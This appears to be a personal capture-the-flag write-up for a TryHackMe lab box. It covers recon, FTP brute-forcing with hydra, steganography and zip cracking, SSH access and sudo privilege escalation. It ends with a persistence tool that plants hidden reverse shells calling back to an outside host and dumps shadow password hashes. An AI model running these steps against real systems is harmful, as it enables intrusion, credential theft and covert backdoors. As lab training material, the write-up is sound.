# Agent Sudo

## Preparation

Added the IP to /etc/hosts as "agent.hack"

## Recon

Identifying OS with ICMP.
```
monty@10.2.14.14 ~/ctfs/thm/agent-sudo $ ping -c 1 agent.hack
PING agent.hack (10.10.166.225) 56(84) bytes of data.
64 bytes from agent.hack (10.10.166.225): icmp_seq=1 ttl=61 time=306 ms
```
Likely Linux.

Identifying open ports (top 1000).
```
nmap -r -v -A -oA recon/nmap/top-1000 agent.hack
...
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Identifying vulnerabilities (top 1000).
```
nmap --script vuln -oA recon/nmap/top-1000-vulns agent.hack
...
Pre-scan script results:
| broadcast-avahi-dos:                                    
|   Discovered hosts:                                     
|     224.0.0.251                                         
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for agent.hack (10.10.166.225)
Host is up (0.36s latency).
Not shown: 996 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp    open     ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open     http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
52848/tcp filtered unknown
```

Identifying all ports.
```
nmap -T4 -p- -oA recon/nmap/allports agent.hack
```

### FTP (21/TCP)

Anonymous authentication not enabled.

### HTTP (80/TCP)

Landing page contains the following text:
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

Using BurpSuite intruder to test all capital letters.

Nothing worked with using "Agent {}", trying just "{}".

Anonmalies: C, R

R is an error, C returns "agent_C_attention.php" in the Location header.

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```

Agent R seems to run things, Agent C's name is Chris and password is weak, there is an Agent J.

Bruteforcing the password for FTP with all seven letter passwords from rockyou (TryHackMe prompt shows it to be seven letters) and the following username: chris

## Cracking the Perimeter

Bruteforcing FTP.
```
hydra -l chris -P ctp/passwords.txt ftp://agent.hack
...
[21][ftp] host: agent.hack   login: chris   password: crystal
```

Had to login with passive FTP, "ftp -p"
```
ftp> ls
227 Entering Passive Mode (10,10,166,225,122,186).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
...
```

```
cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

One of the images has a zip file inside of it.
```
binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Used binwalk to recursively extract until I got to "0.zip"

Can unzip with 7z ("7z x 0.zip") but it has a password, using zip2john and john.

```
zip2john 0.zip > 0.zip.hash
ver 81.9 0.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

john --wordlist=/home/monty/.../rockyou.txt 0.zip.hash 
...
alien            (0.zip/To_agentR.txt)
...
```

```
cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Looks like base64. Decodes to "Area51". That is the password to cute-alien.jpg
```
steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
```

```
cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Trying SSH, it worked.

ssh:james:hackerrules!

## Privilege Escalation

Checking sudo

```
sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

```
sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

```
searchsploit sudo 1.8 local privilege escalation
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escala | linux/local/25134.c
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation   | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                   | linux/local/42183.c
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

gcc not installed on target.

Using CVE-2019-14287

Exploit worked!

```
root@agent-sudo:~# id;hostname;ifconfig
uid=0(root) gid=1000(james) groups=1000(james)
agent-sudo
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.47.229  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::48:6eff:fe9e:c78a  prefixlen 64  scopeid 0x20<link>
        ether 02:48:6e:9e:c7:8a  txqueuelen 1000  (Ethernet)
        RX packets 1806  bytes 135149 (135.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1929  bytes 206108 (206.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 242  bytes 19524 (19.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 242  bytes 19524 (19.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Using linper to set persistence on port 53.

```
root@agent-sudo:/root# bash ~/linper.sh 
[+] Bash reverse shell loaded in crontab
[+] Python3 reverse shell loaded in crontab
[+] Netcat reverse shell loaded in crontab
[+] Bash reverse shell loaded in root's bashrc
[+] Python3 reverse shell loaded in root's bashrc
[+] Netcat reverse shell loaded in root's bashrc
[+] Bash reverse shell installed as a service at /etc/systemd/system/.gtlGr3zncL.service
[+] Python3 reverse shell installed as a service at /etc/systemd/system/.vAjAKTAMLA.service
[+] Netcat reverse shell installed as a service at /etc/systemd/system/.YiomiuJAdA.service
[+] PHP reverse shell placed in /var/www/.hVWoUXtLuO.php
[+] PHP reverse shell placed in /var/www/html/.IhhVvww4n2.php
[+] Users with passwords from the shadow file
james:$6$8U2jtYXx$SgRyvDg2.rjtdQlWohWi0cMgzbJdr0..uGIW3AnUHUQM/l/NfwQBc5o7TQU7N.jmR5tAZvdy9mOmvv8Typ6X20:18198:0:99999:7:::
chris:$6$uuDBd3ZM$LD65lLDXGtbIZqI0fadKxZsTjYg1n8j4VZi0.9O6rNKsxrFwESDTmgGFcyXOnlmx3JL2aW9yqn1TziC0qAePQ/:18198:0:99999:7:::

[+] All shells call back to 10.2.14.14:53
```

Got a proper root shell
```
root@agent-sudo:~# id;hostname;ip addr
id;hostname;ip addr
uid=0(root) gid=0(root) groups=0(root)
agent-sudo
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:48:6e:9e:c7:8a brd ff:ff:ff:ff:ff:ff
    inet 10.10.47.229/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3476sec preferred_lft 3476sec
    inet6 fe80::48:6eff:fe9e:c78a/64 scope link 
       valid_lft forever preferred_lft forever
```